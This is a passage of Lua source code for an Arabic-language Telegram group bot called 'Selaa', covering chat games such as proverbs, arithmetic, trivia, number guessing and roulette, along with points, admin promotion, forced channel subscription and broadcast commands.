Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md')
return false
end end
if text == Selaa:get(Selaa..'Selaa:GameNum4'..msg.chat_id_) and not Selaa:get(Selaa..'Selaa:Games:Ids'..msg.chat_id_) then
if not Selaa:get(Selaa..'Selaa:Games:Ids'..msg.chat_id_) then 
SelaaTEAM = '↯☆مبروك لقد ربحت في اللعبه \n↯☆ارسل ⇇ المختلف للعب مره اخرى'
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md')
Selaa:incrby(Selaa..'Selaa:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
Selaa:set(Selaa..'Selaa:Games:Ids'..msg.chat_id_,true)
end  
if text == 'امثله' and ChCheck(msg) or text == 'الامثله' and ChCheck(msg) then
if Selaa:get(Selaa..'Selaa:Lock:Games'..msg.chat_id_) then
Selaa2 = {
'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
};
name = Selaa2[math.random(#Selaa2)]
Selaa:set(Selaa..'Selaa:GameNum5'..msg.chat_id_,name)
Selaa:del(Selaa..'Selaa:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'جوز','ينطي ___ للماعنده سنون')
name = string.gsub(name,'ضراطه','الي يسوق المطي يتحمل ___ ')
name = string.gsub(name,'بيدك','اكل ___ محد يفيدك')
name = string.gsub(name,'الحافي','تجدي من ___ نعال')
name = string.gsub(name,'شقره','مع الخيل يا ___ ')
name = string.gsub(name,'النخله','الطول طول ___ والعقل عقل الصخلة')
name = string.gsub(name,'سلايه','بالوجه امراية وبالظهر ___ ')
name = string.gsub(name,'الخيل','من قلة ___ شدو على الچلاب سروج')
name = string.gsub(name,'حداد','موكل من صخم وجهه كال آني ___ ')
name = string.gsub(name,'المبلل',' ___ ما يخاف من المطر')
name = string.gsub(name,'الحبل','اللي تلدغة الحية يخاف من جرة ___ ')
name = string.gsub(name,'يركص','المايعرف ___ يكول الكاع عوجه')
name = string.gsub(name,'العنب','المايلوح ___ يكول حامض')
name = string.gsub(name,'العمه','___ إذا حبت الچنة ابليس يدخل الجنة')
name = string.gsub(name,'الخبز','انطي ___ للخباز حتى لو ياكل نصه')
name = string.gsub(name,'بالحصاد','اسمة ___ ومنجله مكسور')
name = string.gsub(name,'شهر','امشي ___ ولا تعبر نهر')
name = string.gsub(name,'شكه','يامن تعب يامن ___ يا من على الحاضر لكة')
name = string.gsub(name,'القرد',' ___ بعين امه غزال')
name = string.gsub(name,'يكحله','اجه ___ عماها')
SelaaTEAM = '↯☆اكمل المثال التالي ⇇ ['..name..']'
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md')
return false
end end
if text == Selaa:get(Selaa..'Selaa:GameNum5'..msg.chat_id_) then
if not Selaa:get(Selaa..'Selaa:Games:Ids'..msg.chat_id_) then 
Selaa:incrby(Selaa..'Selaa:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
Selaa:del(Selaa..'Selaa:GameNum5'..msg.chat_id_)
SelaaTEAM = '↯☆مبروك لقد ربحت في اللعبه \n↯☆ارسل ⇇ امثله للعب مره اخرى'
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md')
end
Selaa:set(Selaa..'Selaa:Games:Ids'..msg.chat_id_,true)
end  
if text == 'رياضيات' and ChCheck(msg) or text == 'الرياضيات' and ChCheck(msg) then
if Selaa:get(Selaa..'Selaa:Lock:Games'..msg.chat_id_) then
Selaa2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
name = Selaa2[math.random(#Selaa2)]
Selaa:set(Selaa..'Selaa:GameNum6'..msg.chat_id_,name)
Selaa:del(Selaa..'Selaa:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'9','7 + 2 = ?')
name = string.gsub(name,'46','41 + 5 = ?')
name = string.gsub(name,'2','5 - 3 = ?')
name = string.gsub(name,'9','5 + 2 + 2 = ?')
name = string.gsub(name,'5','8 - 3 = ?')
name = string.gsub(name,'4','40 ÷ 10 = ?')
name = string.gsub(name,'25','30 - 5 = ?')
name = string.gsub(name,'10','100 ÷ 10 = ?')
name = string.gsub(name,'17','10 + 5 + 2 = ?')
name = string.gsub(name,'15','25 - 10 = ?')
name = string.gsub(name,'39','44 - 5 = ?')
name = string.gsub(name,'5','12 + 1 - 8 = ?')
name = string.gsub(name,'16','16 + 16 - 16 = ?')
SelaaTEAM = '↯☆اكمل المعادله التاليه ⇇ ⤈\n{'..name..'} '
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md')
return false
end end
if text == Selaa:get(Selaa..'Selaa:GameNum6'..msg.chat_id_) then
if not Selaa:get(Selaa..'Selaa:Games:Ids'..msg.chat_id_) then 
Selaa:incrby(Selaa..'Selaa:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
Selaa:del(Selaa..'Selaa:GameNum6'..msg.chat_id_)
SelaaTEAM = '↯☆مبروك لقد ربحت في اللعبه \n↯☆ارسل ⇇ رياضيات للعب مره اخرى'
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md')
end
Selaa:set(Selaa..'Selaa:Games:Ids'..msg.chat_id_,true)
end  
if text == 'الانكليزي' and ChCheck(msg) or text == 'الانجليزيه' and ChCheck(msg) or text == 'انجليزيه' and ChCheck(msg) then
if Selaa:get(Selaa..'Selaa:Lock:Games'..msg.chat_id_) then
Selaa2 = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','سدني','نقود','اعلم','ذئب','تمساح','ذكي','شاطئ','غبي',};
name = Selaa2[math.random(#Selaa2)]
Selaa:set(Selaa..'Selaa:GameNum7'..msg.chat_id_,name)
Selaa:del(Selaa..'Selaa:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ذئب','Wolf')
name = string.gsub(name,'معلومات','Information')
name = string.gsub(name,'قنوات','Channels')
name = string.gsub(name,'مجموعات','Groups')
name = string.gsub(name,'كتاب','Book')
name = string.gsub(name,'تفاحه','Apple')
name = string.gsub(name,'نقود','money')
name = string.gsub(name,'اعلم','I know')
name = string.gsub(name,'تمساح','crocodile')
name = string.gsub(name,'شاطئ','Beach')
name = string.gsub(name,'غبي','Stupid')
name = string.gsub(name,'صداقه','Friendchip')
SelaaTEAM = '↯☆ما معنى كلمة ⇇ '..name
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md')
return false
end end
if text == Selaa:get(Selaa..'Selaa:GameNum7'..msg.chat_id_) then
if not Selaa:get(Selaa..'Selaa:Games:Ids'..msg.chat_id_) then 
Selaa:incrby(Selaa..'Selaa:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
Selaa:del(Selaa..'Selaa:GameNum7'..msg.chat_id_)
SelaaTEAM = '↯☆مبروك لقد ربحت في اللعبه \n↯☆ارسل ⇇ انجليزيه للعب مره اخرى'
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md')
end
Selaa:set(Selaa..'Selaa:Games:Ids'..msg.chat_id_,true)
end  
--     Source Selaa     --
if text == 'اسئله' and ChCheck(msg) or text == 'اختيارات' and ChCheck(msg) or text == 'الاسئله' and ChCheck(msg) or text == 'اساله' and ChCheck(msg) then
if Selaa:get(Selaa..'Selaa:Lock:Games'..msg.chat_id_) then
Selaa2 = {'النيل','14','الفم','11','30','بوتين','ستيف جوبر','باريس','10','النمل','حرف الواو','الشعر','سحاب','الاسم','ذهب','حرف الام','العزائم','انسات','المنجنيق','اسيا','6','الاسد','مهر','الدولفين','اوروبا','الزئبق','لندن','الانسان','طوكيو','خديجه',}
name = Selaa2[math.random(#Selaa2)]
Selaa:set(Selaa..'Selaa:GameNum8'..msg.chat_id_,name)
Selaa:del(Selaa..'Selaa:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'النيل','↯☆ماهو اطول نهر في العالم ؟\n1- النيل\n2- الفرات\n3- نهر الكونغو')
name = string.gsub(name,'14','↯☆ماعدد عظام الوجه ؟\n1- 15\n2- 13\n3- 14')
name = string.gsub(name,'الفم','↯☆كراسي بيضاء وجدران ورديه اذا اغلقته اصبح ظلام  فمن اكون ؟\n1- الفم\n2- الاذن\n3- الثلاجه')
name = string.gsub(name,'11','↯☆كم جزء يحتوي مسلسل وادي الذئاب ؟\n1- 7\n2- 15\n3- 11')
name = string.gsub(name,'30','↯☆كم جزء يحتوي القران الكريم ؟\n1- 60\n2- 70\n3- 30')
name = string.gsub(name,'بوتين','↯☆من هوه اغنى رئيس في العالم ؟\n1- ترامب\n2- اوباما\n3- بوتين')
name = string.gsub(name,'ستيف جوبر','↯☆من هوه مؤسس شركه ابل العالميه  ؟\n1- لاري بايج\n2- بيل جيتس\n3- ستيف جوبر')
name = string.gsub(name,'باريس','ماهي عاصمه فرنسا ؟\n1- باريس\n2- لوين\n3- موسكو')
name = string.gsub(name,'10','↯☆ماعدد دول العربيه التي توجد في افريقيا ؟\n1- 10\n2- 17\n3- 9')
name = string.gsub(name,'النمل','↯☆ماهو الحيوان الذي يحمل 50 فوق وزنه ؟\n1- الفيل\n2- النمل\n3- الثور')
name = string.gsub(name,'حرف الواو','↯☆ماذا يوجد بيني وبينك ؟\n1- الضل\n2- الاخلاق\n3- حرف الواو')
name = string.gsub(name,'الشعر','↯☆ماهو الشيء النبات ينبت للانسان بلا بذر ؟\n1- الاضافر\n2- الاسنان\n3- الشعر')
name = string.gsub(name,'سحاب','↯☆ما هو الشّيء الذي يستطيع المشي بدون أرجل والبكاء بدون أعين ؟\n1- سحاب\n2- بئر\n3- نهر')
name = string.gsub(name,'الاسم','↯☆ما الشيء الذي نمتلكه , لكنّ غيرنا يستعمله أكثر منّا ؟\n1- العمر\n2- ساعه\n3- الاسم')
name = string.gsub(name,'ذهب','↯☆اصفر اللون سارق عقول اهل الكون وحارمهم لذيذ النوم ؟\n1- نحاس\n2- الماس\n3- ذهب')
name = string.gsub(name,'حرف الام','↯☆في الليل ثلاثة لكنه في النهار واحده فما هو ؟\n1- حرف الباء\n2- حرف الام\n3- حرف الراء')
name = string.gsub(name,'العزائم','↯☆على قدر اصل العزم تأتي ؟\n1- العزائم\n2- المكارم\n3- المبائب')
name = string.gsub(name,'انسات','↯☆ماهي جمع كلمه انسه ؟\n1- سيدات\n2- انسات\n3- قوانص')
name = string.gsub(name,'المنجنيق','↯☆اله اتسعلمت قديما في الحروب ؟\n1- الصاروخ\n2- المسدس\n3- المنجنيق')
name = string.gsub(name,'اسيا','↯☆تقع لبنان في قاره ؟\n1- افريقيا\n2- اسيا\n3- امركيا الشماليه')
name = string.gsub(name,'6','↯☆كم صفرا للمليون ؟\n1- 4\n2- 3\n3- 6')
name = string.gsub(name,'الاسد','↯☆ماهو الحيوان الذي يلقب بملك الغابه ؟\n1- الفيل\n2- الاسد\n3- النمر')
name = string.gsub(name,'مهر','↯☆ما اسم صغير الحصان ؟\n1- مهر\n2- جرو\n3- عجل')
name = string.gsub(name,'الدولفين','↯☆ما الحيوان الذي ينام واحدى عينه مفتوحه ؟\n1- القرش\n2- الدولفين\n3- الثعلب\n')
name = string.gsub(name,'اوروبا','↯☆ماهي القاره التي تلقب بالقاره العجوز ؟\n1- اوروبا\n2- امريكا الشماليه\n3- افريقيا')
name = string.gsub(name,'الزئبق','↯☆ما اسم المعدن الموجود فيي الحاله السائله ؟\n1- النحاس\n2- الحديد\n3- الزئبق')
name = string.gsub(name,'لندن','↯☆ماهي عاصمه انجلترا ؟\n1- لندن\n2- لفرسول\n3- تركيا')
name = string.gsub(name,'الانسان','↯☆ماهو الشئ الذي برأسه سبع فتحات ؟\n1- الهاتف\n2- التلفاز\n3- الانسان')
name = string.gsub(name,'طوكيو','↯☆ماهي عاصمه اليابان ؟\n1- بانكول\n2- نيو دلهي\n3- طوكيو')
name = string.gsub(name,'خديجه','↯☆من هي زوجه الرسول الاكبر منه سنآ ؟\n1- حفضه\n2- زينب\n3- خديجه')
SelaaTEAM = name..'\n↯☆ارسل الجواب الصحيح فقط'
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md')
return false
end end
if text == Selaa:get(Selaa..'Selaa:GameNum8'..msg.chat_id_) then
if not Selaa:get(Selaa..'Selaa:Games:Ids'..msg.chat_id_) then 
Selaa:incrby(Selaa..'Selaa:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
Selaa:del(Selaa..'Selaa:GameNum8'..msg.chat_id_)
SelaaTEAM = '↯☆مبروك لقد ربحت في اللعبه \n↯☆ارسل ⇇ الاسئله للعب مره اخرى'
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md')
end
Selaa:set(Selaa..'Selaa:Games:Ids'..msg.chat_id_,true)
end  
--     Source Selaa     --
if Selaa:get(Selaa.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Selaa(msg.chat_id_, msg.id_, 1,"↯☆عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = Selaa:get(Selaa.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
Selaa:del(Selaa..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
Selaa:del(Selaa.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
Selaa:incrby(Selaa..'Selaa:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
Selaa(msg.chat_id_, msg.id_, 1,'↯☆*التخمين الصحيح هو* ⇇ '..NUM..'\n↯☆*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
Selaa:incrby(Selaa..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(Selaa:get(Selaa..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
Selaa:del(Selaa..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
Selaa:del(Selaa.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
Selaa(msg.chat_id_, msg.id_, 1,'↯☆*التخمين الصحيح هو* ⇇ '..GETNUM..'\n↯☆*للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
else
if tonumber(Selaa:get(Selaa..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(Selaa:get(Selaa..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
SetNum = 'محاوله واحده فقط'
end
Selaa(msg.chat_id_, msg.id_, 1,'↯☆لقد خمنت الرقم الخطا وتبقى لديك '..SetNum..' ارسل رقم تخمنه مره اخرى للفوز', 1, 'md')
end
end
end
end
if text == 'خمن' and ChCheck(msg) or text == 'تخمين' and ChCheck(msg) then   
if Selaa:get(Selaa..'Selaa:Lock:Games'..msg.chat_id_) then
Num = math.random(1,20)
Selaa:set(Selaa.."GAMES:NUM"..msg.chat_id_,Num) 
Selaa(msg.chat_id_, msg.id_, 1,'↯☆اهلا بك عزيزي في لعبة التخمين ⇇ ⤈\n ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉ ≈ ┉\n↯☆سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n↯☆ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
Selaa:setex(Selaa.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
end
--     Source Selaa     --
if text == 'روليت' then
if Selaa:get(Selaa..'Selaa:Lock:Games'..msg.chat_id_) then
Selaa:del(Selaa.."Selaa:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
Selaa:del(Selaa..'Selaa:ListRolet'..msg.chat_id_)  
Selaa:setex(Selaa.."Selaa:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Selaa(msg.chat_id_, msg.id_, 1, '↯☆حسنا لنلعب , ارسل عدد اللاعبين للروليت .', 1, 'md')
return false  
end
end
if text:match("^(%d+)$") and Selaa:get(Selaa.."Selaa:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "↯☆لا استطيع بدء اللعبه بلاعب واحد فقط"
else
Selaa:set(Selaa.."Selaa:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = '↯☆تم بدء تسجيل اللسته يرجى ارسال المعرفات \n↯☆الفائز يحصل على 5 نقاط عدد المطلوبين ⇇ '..text..' لاعب'
end
Selaa:del(Selaa.."Selaa:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text:match('^(@[%a%d_]+)$') and Selaa:get(Selaa.."Selaa:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if Selaa:sismember(Selaa..'Selaa:ListRolet'..msg.chat_id_,text) then
send(msg.chat_id_,msg.id_,'↯☆المعرف ⇇ ['..text..'] موجود اساسا')
return false
end
tdcli_function ({ID = "SearchPublicChat",username_ = text},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Selaa(msg.chat_id_, msg.id_, 1,'↯☆المعرف غير صحيح يرجى ارسال معرف صحيح', 1, 'md')
return false 
end
Selaa:sadd(Selaa..'Selaa:ListRolet'..msg.chat_id_,text)
local CountAdd = Selaa:get(Selaa.."Selaa:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = Selaa:scard(Selaa..'Selaa:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
Selaa:del(Selaa.."Selaa:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
Selaa:setex(Selaa.."Selaa:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
local Text = "↯☆تم ادخال المعرف ⇇ ["..text.."]\n↯☆وتم اكتمال العدد الكلي هل انت مستعد ؟"
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="لا",callback_data="/NoRolet"}},{{text="اللاعبين",callback_data="/ListRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
local Text = "↯☆تم ادخال المعرف ⇇ ["..text.."] وتبقى ⇇ "..CountUser.." لاعبين ليكتمل العدد ارسل المعرف الاخر"
keyboard = {} 
keyboard.inline_keyboard = {{{text="الغاء",callback_data="/NoRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil) 
end
--     Source Selaa     --
if text == 'الالعاب' and ChCheck(msg) or text == 'العاب' and ChCheck(msg) or text == 'اللعبه' and ChCheck(msg) then
if Selaa:get(Selaa..'Selaa:Lock:Games'..msg.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1,[[
↯☆قائمة العاب المجموعه ⇇ ⤈
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆لعبة التخمين ⇇ خمن
↯☆لعبة الامثله ⇇ امثله
↯☆لعبة العكس ⇇ العكس
↯☆لعبة الاسئله ⇇ اسئله
↯☆لعبة الروليت ⇇ روليت
↯☆لعبة الحزوره ⇇ حزوره
↯☆لعبة الترتيب ⇇ ترتيب
↯☆لعبة المعاني ⇇ معاني
↯☆لعبة المختلف ⇇ المختلف
↯☆لعبة السمايلات ⇇ سمايلات
↯☆لعبة المحيبس ⇇ المحيبس
↯☆لعبة الرياضيات ⇇ رياضيات
↯☆لعبة الانجليزيه ⇇ انجليزيه
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆نقاطي • بيع نقاطي
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆[Source Channel](https://t.me/sourcesela)
]], 1, 'md')
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆عذرا الالعاب معطله في المجموعه', 1, 'md')
end
end
--     Source Selaa     --
if text == 'بيع نقاطي' and ChCheck(msg) then
if tonumber((Selaa:get(Selaa..'Selaa:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Selaa(msg.chat_id_, msg.id_, 1,'↯☆لم تربح اي نقطه\n↯☆ارسل ⇇ الالعاب للعب', 1, 'md')
else
Selaa0 = (Selaa:get(Selaa..'Selaa:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
Selaa:incrby(Selaa..'Selaa:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,Selaa0)
Selaa(msg.chat_id_, msg.id_, 1,'↯☆تم بيع '..(Selaa:get(Selaa..'Selaa:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n↯☆كل نقطه تساوي 50 رساله', 'md')
Selaa:del(Selaa..'Selaa:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
--     Source Selaa     --
if text == 'رفع المشرفين' and ChCheck(msg) or text == 'رفع الادمنيه' and ChCheck(msg) then  
local function promote_admin(extra, result, success)  
Selaa:del(Selaa..'Selaa:SelaaConstructor:'..msg.chat_id_)
local num = 0
local admins = result.members_  
for i=0 , #admins do   
if result.members_[i].bot_info_ == false and result.members_[i].status_.ID == "ChatMemberStatusEditor" then
Selaa:sadd(Selaa..'Selaa:Admins:'..msg.chat_id_, admins[i].user_id_)   
num = num + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,dp) 
if dp.first_name_ == false then
Selaa:srem(Selaa..'Selaa:Admins:'..msg.chat_id_, admins[i].user_id_)   
end
end,nil)   
else
Selaa:srem(Selaa..'Selaa:Admins:'..msg.chat_id_, admins[i].user_id_)   
end 
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then  
Manager_id = admins[i].user_id_  
Selaa:sadd(Selaa..'Selaa:BasicConstructor:'..msg.chat_id_,Manager_id)  
Selaa:sadd(Selaa..'Selaa:SelaaConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆لا يوجد ادمنيه ليتم رفعهم\n↯☆تم رفع منشئ المجموعه", 1, 'md')
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم رفع '..num..' من الادمنيه \n↯☆تم رفع منشئ المجموعه', 1, 'md')
end
end
getChannelMembers(msg.chat_id_,0, 'Administrators', 100, promote_admin)
end
--     Source Selaa     --
if text == 'غادر' and SudoBot(msg) then
if Selaa:get(Selaa.."Selaa:Left:Bot"..Selaa) and not Sudo(msg) then
Selaa(msg.chat_id_,msg.id_, 1, "↯☆المغادره معطله من قبل المطور الاساسي", 1, 'md')
return false  
end
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم مغادرة المجموعه \n↯☆تم حذف جميع بياناتها ', 1, 'md')
ChatLeave(msg.chat_id_, Selaa)
Selaa:srem(Selaa.."Selaa:Groups",msg.chat_id_)
end
--     Source Selaa     --
if text ==('موقعي') and ChCheck(msg) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
rtpa = 'المنشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
rtpa = 'الادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
rtpa = 'عضو'
end
Selaa(msg.chat_id_, msg.id_, 1, '↯☆موقعك ⇇ '..rtpa, 1, 'md')
end,nil)
end
--     Source Selaa     --
if text:match("^معلوماتي$") and ChCheck(msg) then
function get_me(extra,result,success)
local msguser = tonumber(Selaa:get(Selaa..'Selaa:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = Selaa:get(Selaa..'Selaa:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(Selaa:get(Selaa..'Selaa:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(Selaa:get(Selaa..'Selaa:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
if result.last_name_ then lastname = result.last_name_ else lastname = '' end
Selaa(msg.chat_id_, msg.id_, 1, '↯☆اسمك ⇇ ❨ ['..result.first_name_..'] ❩\n↯☆معرفك ⇇ ❨ ['..username..'] ❩\n↯☆ايديك ⇇ ❨ `'..result.id_..'` ❩\n↯☆نقاطك ⇇ ❨ '..user_nkt..' ❩\n↯☆رسائلك ⇇ ❨ '..user_msgs..' ❩\n↯☆جهاتك ⇇ ❨ '..cont..' ❩\n↯☆تفاعلك ⇇ '..formsgs(msguser)..'\n↯☆رتبتك ⇇ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'md')
end
getUser(msg.sender_user_id_,get_me)
end
end
--     Source Selaa     --
if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" or text == "تعيين الاشتراك الاجباري" or text == "وضع قناة الاشتراك" then
if not Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمطور الاساسي فقط ', 1, 'md')
else
Selaa:setex(Selaa..'Selaa4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_, '↯☆ارسل لي معرف قناة الاشتراك الان')
end
return false  
end
if text == "تفعيل الاشتراك الاجباري" then  
if not Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمطور الاساسي فقط ', 1, 'md')
else
if Selaa:get(Selaa..'Selaa2') then
local DevCh = Selaa:get(Selaa..'Selaa3')
send(msg.chat_id_, msg.id_,"↯☆الاشتراك الاجباري مفعل \n↯☆على القناة ⇇ ["..DevCh.."]")
else
Selaa:setex(Selaa..'Selaa4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_,"↯☆لاتوجد قناة لتفعيل الاشتراك\n↯☆ارسل لي معرف قناة الاشتراك الان")
end
end
return false  
end
if text == "تعطيل الاشتراك الاجباري" then  
if not Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمطور الاساسي فقط ', 1, 'md')
else
Selaa:del(Selaa..'Selaa2') Selaa:del(Selaa..'Selaa3')
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل الاشتراك الاجباري'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
return false  
end
if text == "حذف قناة الاشتراك" or text == "حذف قناه الاشتراك" then
if not Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمطور الاساسي فقط ', 1, 'md')
else
Selaa:del(Selaa..'Selaa2') Selaa:del(Selaa..'Selaa3')
Selaa(msg.chat_id_, msg.id_, 1,"↯☆تم حذف قناة الاشتراك الاجباري", 1, 'md') 
end
end
if Sudo(msg) then
if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' or text == 'الاشتراك الاجباري' or text == 'قناة الاشتراك الاجباري' then
if Selaa:get(Selaa..'Selaa3') then
local DevCh = Selaa:get(Selaa..'Selaa3')
send(msg.chat_id_, msg.id_, "↯☆قناة الاشتراك ⇇ ["..DevCh.."]")
else
send(msg.chat_id_, msg.id_, "↯☆لاتوجد قناة في الاشتراك الاجباري")
end
return false  
end end
--     Source Selaa     --
if SudoBot(msg) then
if text == 'اذاعه للكل بالتوجيه' and tonumber(msg.reply_to_message_id_) > 0 then
function SelaaTEAM(extra,result,success)
if Selaa:get(Selaa.."Selaa:Send:Bot"..Selaa) and not Sudo(msg) then 
send(msg.chat_id_, msg.id_,"↯☆الاذاعه معطله من قبل المطور الاساسي")
return false
end
local listgp = Selaa:smembers(Selaa.."Selaa:Groups")
for k,v in pairs(listgp) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local listpv = Selaa:smembers(Selaa.."Selaa:Users")
for k,v in pairs(listpv) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم اذاعة رسالتك بالتوجيه \n↯☆‏في ⇇ ❨ '..#listgp..' ❩ مجموعه \n↯☆والى ⇇ ❨ '..#listpv..' ❩ مشترك \n ✓', 1, 'md')
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),SelaaTEAM)
end
end
--     Source Selaa     --
if text:match("^مشاهده المنشور$") and ChCheck(msg) or text:match("^مشاهدات المنشور$") and ChCheck(msg) or text:match("^عدد المشاهدات$") and ChCheck(msg) then
Selaa:set(Selaa..'Selaa:viewget'..msg.sender_user_id_,true)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆حسنا قم باعادة توجيه للمنشور الذي تريدني حساب مشاهداته', 1, 'md')
end
--     Source Selaa     --
if text:match("^السورس$") or text:match("^سورس$") then 
